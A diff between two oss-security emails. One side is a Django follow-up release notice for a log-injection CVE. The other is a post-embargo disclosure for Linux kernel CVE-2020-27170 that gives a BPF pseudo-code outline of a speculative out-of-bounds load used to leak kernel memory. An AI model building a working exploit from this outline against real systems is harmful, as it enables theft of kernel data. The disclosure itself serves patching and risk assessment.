@@ -1,4 +1,9 @@
-Received: (qmail 19478 invoked by uid 550); 10 Jun 2025 14:46:20 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1580" "Wednesday" "24" "March" "2021" "19:34:50" "+0000" "Piotr Krysiuk" "piotras@gmail.com" nil "39" "[oss-security] Re: [CVE-2020-27170] Protection against speculatively out-of-bounds loads in the Linux kernel can be bypassed by unprivileged local users to leak content of kernel memory" nil nil nil "3" nil nil (number mark "U       piotras@gmai Mar 24   39/1580  " thread-indent "\"[oss-security] Re: [CVE-2020-27170] Protection against speculatively out-of-bounds loads in the Linux kernel can be bypassed by unprivileged local users to leak content of kernel memory\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Re: [CVE-2020-27170] Protection against speculatively out-of-bounds loads in the Linux kernel can be bypassed by unprivileged local users to leak content of kernel memory" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 3134 invoked by uid 550); 24 Mar 2021 19:38:52 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,144 +12,81 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 13330 invoked from network); 10 Jun 2025 13:38:37 -0000
+Received: (qmail 32477 invoked from network); 24 Mar 2021 19:35:13 -0000
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=djangoproject-com.20230601.gappssmtp.com; s=20230601; t=1749562707; x=1750167507; darn=lists.openwall.com;
-        h=cc:to:subject:message-id:date:from:in-reply-to:references
-         :mime-version:from:to:cc:subject:date:message-id:reply-to;
-        bh=6Ah3zqW9v+Helseoz6RNjhAA17hqH2uSx1IkvEYpcCw=;
-        b=x4nK6UpjCzwHKvkKh2g0Csxbza0IThbjQ5TCXvIAHvlx4xHM/qK4YEexPuz/vApHJn
-         +7FUUZcAxbrIUUquS4tKi8a2DxzeiycVGikwnPN5zyODyloHSOpfekmOSbQKNyXeJuPR
-         YNBjII/BajeI7cCyd3Py286uVrHdfqsFd8T9GzcJmB1N/ZeOw9r13kwn9KToVSi6DhYi
-         YIGfJyixIFf1o+mDfsun6248kqBjiKSqiMv0swhQbSEedXJNO6dTyqUKQHV1UQ+7T34o
-         rpdIAQK1Np6Q2v9buWWE4DZv635moLQ6uLzwytKaUGcepa6L0UqUFgg7SeMihhW+L0T/
-         9RzA==
+        d=gmail.com; s=20161025;
+        h=mime-version:references:in-reply-to:from:date:message-id:subject:to;
+        bh=4c3uLqxmCsRVNi9Z3i4lBTFAGZWyEr4nyJTqDy+hPDg=;
+        b=VIF0m8a0aNL1MZ8DNruBYbNuFX1fCc7jrHKRts6icpGO38McT7hwExG5D1FE7/eLJZ
+         7usuZqxM4429ljx+Kb4XgPui9yx7f1bV3f4b4FaqMZOwztpP9FRHzaMsHv259FM7Ibbj
+         uF6trDF3KrRiSd3JGol7sFenZO5PBWx1x8KC2yheqPbdqpH0aV6hR2t9pmSGi7xbU5SX
+         EQ0m++QAEYPcOH/euF0GlcxEED+c1JEPkXMWBMRnTd2iBsoJbw4dJL06xlrf7pdrm7e0
+         zcQYOtv9duETHg4g5ooah1fvzTQaiNN4hn6FZId3pRuqxvB/gmYANa2JXboRzG1Y2ojp
+         q16A==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20230601; t=1749562707; x=1750167507;
-        h=cc:to:subject:message-id:date:from:in-reply-to:references
-         :mime-version:x-gm-message-state:from:to:cc:subject:date:message-id
-         :reply-to;
-        bh=6Ah3zqW9v+Helseoz6RNjhAA17hqH2uSx1IkvEYpcCw=;
-        b=kBN5Vzd6c84PNcY4UAbNJ9mm6QV9y08cWU8woftsh9FutFkhdeeCWCxqgmCWmGRwNd
-         mlCyeypaUxMnt7flyevpsqJqVnP0fMv8EJFEMkaoq2S20EGHWm7tMcHMKx0oecemCn+P
-         ne17H03iico10WvDy1xWXnH9Jsp9etQTobec/o53YkyX1O0KJtUDbtzfcsZL5k+mTaAa
-         nzMlG/ownRFASjUshZNQk96Bg/xhWN7IImN0eou+6Nqv2vOkYA0NjoQcLirISNKiKbuf
-         d3Hbehj+s3LMa5a+kn8qAp5t2al2loXTqlmBsy+sLZSzf+rmdMnCFwePmF2W0GeqNRO4
-         C4XQ==
-X-Gm-Message-State: AOJu0YzzKrOvRudxDC5/qacw56qlX4R2+zF+Nyjixy/lh5WP+TWgwSvU
-	aTMgIJ9EeuLQuN59vhXGsPtwVHk8/GA7oCxoAjUXB+KX9HTopMpzDfmyHYcb/v/SmOO1Mbu7rxz
-	h/VpTHedVFBNb5d1Lg+mo1OjVghMCTEVRHnKNKWnzFi5ty1XHiwB0Ras=
-X-Gm-Gg: ASbGncsrsUVaG/Wtkx3KW7mqwKHDDz9u66rovM1mdymeS9P6ZU8Qk1e0/wNYQikFblC
-	XnY8R01HyRIeBQzguvd03PR2DwASDzQn4wZt+uYICxeJAo3Y6QWD1WRCYvXxmGtvsYyd3KibzM8
-	+r6DjhD1ukMpio8dlW9QxY/jNuZ3pxcmhwOlTtYND8ztmvXqsZ+JQhY1nwYw7se/yd4B8kvD1AA
-	C7rqw==
-X-Google-Smtp-Source: AGHT+IECKdjfOyZsouGzpR99Eh7CuNTEFzbz/yAbazWT3j6BUWOfWnyjAYPIYNFADgWHj12O4U3RqfbmGPbERY5O+p8=
-X-Received: by 2002:a17:907:c27:b0:ad5:4806:4f07 with SMTP id
- a640c23a62f3a-ade1a9e22d5mr1464731466b.2.1749562706642; Tue, 10 Jun 2025
- 06:38:26 -0700 (PDT)
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:mime-version:references:in-reply-to:from:date
+         :message-id:subject:to;
+        bh=4c3uLqxmCsRVNi9Z3i4lBTFAGZWyEr4nyJTqDy+hPDg=;
+        b=a09x76yPwO/fd0bm2CIUd5zLfvpfrm9/+zByDBRqQKUZoZarM3D0fiqos4mmR+NTEk
+         QZ4/2JGH5ghJn4ylRd1dQdPPnZEOBJO0euBBmWPJclSvhMzZJgIsk420fO/QtoHeX0Y6
+         5podPkEIfRJqh1FdPm0rMM4qile72VZJOg/eRvMha22sNvyW0kPWCxlHJUaYooVWtQyw
+         mNR9XM8dYaCHJuvybwn/8if/Ha0MNomLF+VVuEpXvvpCnaEs699W6wtl1AmUR6hi0T7F
+         34RcBt1qft0gTHbjtC0UmssEZphniPJcPlKfSAS83B8eC72DnmgsXShEvUcidq54Km2r
+         tAwQ==
+X-Gm-Message-State: AOAM530ODn337DjcFKtv+27644xFqQvxjHyUD1wpyDUf4MxM3c6I6FWR
+	ms1TcWVRgjR85LZmcOs//vbF0KuAWRejdalheDraj+RyIBFKVg==
+X-Google-Smtp-Source: ABdhPJyLYU4qgVn1x8XkdKgcwVxxsxSd/PB4vX4Gx5KfgzQ8X/s1o3TJfDJ2csjrIR85KrZW8ugTh9sa1jQoEek8hjE=
+X-Received: by 2002:a5d:4281:: with SMTP id k1mr5119532wrq.374.1616614501666;
+ Wed, 24 Mar 2021 12:35:01 -0700 (PDT)
 MIME-Version: 1.0
-References: <CAN+fQHzDjwHONmFdu17_O-SkiG1i3Z637i-6EsJnnq4rd9HrWg@mail.gmail.com>
-In-Reply-To: <CAN+fQHzDjwHONmFdu17_O-SkiG1i3Z637i-6EsJnnq4rd9HrWg@mail.gmail.com>
-From: Sarah Boyce <sarahboyce@djangoproject.com>
-Date: Tue, 10 Jun 2025 15:38:15 +0200
-X-Gm-Features: AX0GCFt8fnIpp3ZcfVj56zyygtMOHpm-5dBF7GcYXduTLF9KArlgegNosiivcsQ
-Message-ID: <CAN+fQHxMprnZ3cD=-2Gviw9hoqwZmAxRr0_StjB=3Gj1d1Wong@mail.gmail.com>
+References: <CAFzhf4pJm_SLYd_tE69gspYvXm0VRvxhEi6c2JFL4cx_5=wwQg@mail.gmail.com>
+In-Reply-To: <CAFzhf4pJm_SLYd_tE69gspYvXm0VRvxhEi6c2JFL4cx_5=wwQg@mail.gmail.com>
+From: Piotr Krysiuk <piotras@gmail.com>
+Date: Wed, 24 Mar 2021 19:34:50 +0000
+Message-ID: <CAFzhf4rREUjn4=Z45GBxvo4CAvf5=xPEiu3O0rpnWF3hR-7AxQ@mail.gmail.com>
 To: oss-security@lists.openwall.com
-Cc: Django Security Team <security@djangoproject.com>
-Content-Type: multipart/alternative; boundary="000000000000a46020063737cf5c"
-Subject: [oss-security] Re: Django CVE-2025-48432 (follow-up patch releases)
-
---000000000000a46020063737cf5c
 Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+Subject: [oss-security] Re: [CVE-2020-27170] Protection against speculatively out-of-bounds
+ loads in the Linux kernel can be bypassed by unprivileged local users to leak
+ content of kernel memory
 
-Corrected announcement link:
-https://www.djangoproject.com/weblog/2025/jun/10/bugfix-releases/
+Some details of how CVE-2020-27170 could be exploited in practice were
+provided via linux-distros mailing list with 7 days embargo. This was
+intended to help any affected Linux distributions to assess the risk
+and decide about any appropriate actions.
 
-On Tue, Jun 10, 2025 at 3:28=E2=80=AFPM Sarah Boyce <sarahboyce@djangoproje=
-ct.com>
-wrote:
+As the embargo expires today, I was asked to share these details
+publically on oss-security.
 
-> https://www.djangoproject.com/weblog/2025/jun/04/security-releases/
->
-> Following the June 4, 2025 security release, the Django team is issuing
-> releases for
-> `Django 5.2.3 <https://docs.djangoproject.com/en/dev/releases/5.2.3/>`_,
-> `Django 5.1.11 <https://docs.djangoproject.com/en/dev/releases/5.1.11/>`_,
-> and
-> `Django 4.2.23 <https://docs.djangoproject.com/en/dev/releases/4.2.23/>`_
-> to
-> complete mitigation for CVE-2025-48432: Potential log injection via
-> unescaped
-> request path (`full description <
-> https://www.djangoproject.com/weblog/2025/jun/04/security-releases/>`_).
->
-> These follow-up releases migrate remaining response logging paths to a
-> safer
-> logging implementation, ensuring that all untrusted input is properly
-> escaped
-> before being written to logs. This update does not introduce a new CVE but
-> strengthens the original fix.
->
-> We encourage all users of Django to upgrade as soon as possible.
->
-> Affected supported versions
-> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D
->
-> * Django main
-> * Django 5.2
-> * Django 5.1
-> * Django 4.2
->
-> Resolution
-> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
->
-> Patches to resolve the issue have been applied to Django's
-> main, 5.2, 5.1, and 4.2 branches.
-> The patches may be obtained from the following changesets.
->
-> CVE-2025-48432: Potential log injection via unescaped request path
-> ------------------------------------------------------------------
->
-> * On the `main branch <
-> https://github.com/django/django/commit/957951755259b412d5113333b32bf8587=
-1d29814/
-> >`__
-> * On the `5.2 branch <
-> https://github.com/django/django/commit/8fcc83953c350e158a484bf1da0aa1b79=
-b69bb07/
-> >`__
-> * On the `5.1 branch <
-> https://github.com/django/django/commit/31f4bd31fa16f7f5302f65b9b8b7a49b6=
-9a7c4a6/
-> >`__
-> * On the `4.2 branch <
-> https://github.com/django/django/commit/b597d46bb19c8567615e62029210dab16=
-c70db7d/
-> >`__
->
->
-> The following releases have been issued
-> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
->
-> * Django 5.2.3 (`download Django 5.2.3
->   <https://www.djangoproject.com/download/5.2.3/tarball/>`_ |
->   `5.2.3 checksums
->   <https://www.djangoproject.com/download/5.2.3/checksum/>`_)
-> * Django 5.1.11 (`download Django 5.1.11
->   <https://www.djangoproject.com/download/5.1.11/tarball/>`_ |
->   `5.1.11 checksums
->   <https://www.djangoproject.com/download/5.1.11/checksum/>`_)
-> * Django 4.2.23 (`download Django 4.2.23
->   <https://www.djangoproject.com/download/4.2.23/tarball/>`_ |
->   `4.2.23 checksums
->   <https://www.djangoproject.com/download/4.2.23/checksum/>`_)
->
-> The PGP key ID used for this release is : `3955B19851EA96EF <
-> https://github.com/sarahboyce.gpg>`_
->
+The CVE-2020-27170 vulnerability has been successfully reproduced
+against Linux kernel v5.12-rc3 using the following logic for BPF
+program attached to a socket:
 
---000000000000a46020063737cf5c--
+    load bpf_context pointer (BPF_REG_1) into BPF_REG_CTX,
+    load pointer to our big array into BPF_REG_MAP_PTR,
+    load offset of data to leak into BPF_REG_OFFSET,
+
+    // load any slowly-loaded value...
+    BPF_LDX_MEM(BPF_DW, BPF_REG_SLOW_CHECK, BPF_REG_MAP_PTR, 0x1200),
+
+    // ... and turn it into known zero for verifier,
+    // while preserving slowly-loaded dependency for affected hardware
+    BPF_ALU64_IMM(BPF_AND, BPF_REG_SLOW_CHECK, 1),
+    BPF_ALU64_IMM(BPF_AND, BPF_REG_SLOW_CHECK, 2),
+
+    // speculatively bypassed offset check
+    BPF_JMP_REG(BPF_JNE, BPF_REG_OFFSET, BPF_REG_SLOW_CHECK,
+                skip_speculation),
+
+    // speculatively unbounded pointer arithmetic
+    BPF_ALU64_REG(BPF_ADD, BPF_REG_CTX, BPF_REG_OFFSET),
+
+    // speculatively unbounded load
+    BPF_LDX_MEM(BPF_W, BPF_REG_LEAKED_WORD, BPF_REG_CTX,
+                offsetof(struct __sk_buff, protocol)),
+
+    transmit speculatively loaded BPF_REG_LEAKED_WORD via side-channel,
+
+The full reproducers were shared with a number of Linux distributions
+for protection purposes.
